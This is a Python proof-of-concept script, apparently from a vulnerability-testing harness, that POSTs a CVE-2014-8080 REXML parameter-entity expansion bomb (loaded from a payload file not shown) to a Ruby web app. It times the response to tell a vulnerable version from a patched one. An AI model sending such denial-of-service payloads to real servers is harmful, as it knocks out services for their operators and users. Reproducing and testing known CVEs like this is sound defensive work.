#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2014-8080 seed exploit, delivered over EXTERNAL HTTP.

POSTs the CVE-2014-8080 parameter-entity value bomb (payloads/original_attack.xml) to the REAL Ruby
web app (POST /parse), which parses it with the REAL bundled REXML of that MRI version. Nested
PARAMETER entities a..j (10x per level) whose *values* reference each other expand through
Entity#value; on V0 (ruby 2.1.3) that sink is UNCAPPED -> exponential text -> server-side DoS. The
CVE-2014-8080 fix (ruby 2.1.4, V1) adds a per-value byte cap in Entity#value, so V1 raises
"entity expansion has grown too large" almost immediately -> FAST/bounded.

Expected: SLOW (hang or crash) on V0; FAST (limited) on V1/V2.

Usage: original_poc.py http://127.0.0.1:28220
"""
import http.client
import json
import os
import socket
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
HTTP_TIMEOUT_S = 10.0


def load_payload():
    with open(os.path.join(HERE, "payloads", "original_attack.xml"), "rb") as f:
        return f.read()


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = load_payload()
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=body,
                  headers={"Content-Type": "application/xml", "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "crash": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "crash": False, "resp": None}
    except (http.client.RemoteDisconnected, ConnectionResetError, ConnectionRefusedError, OSError) as e:
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "crash": True,
                "resp": None, "error": str(e)}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28220"
    out = run(base)
    out["poc"] = "original/CVE-2014-8080"
    out["payload_bytes"] = len(load_payload())
    out["target"] = base
    print(json.dumps(out, indent=2))
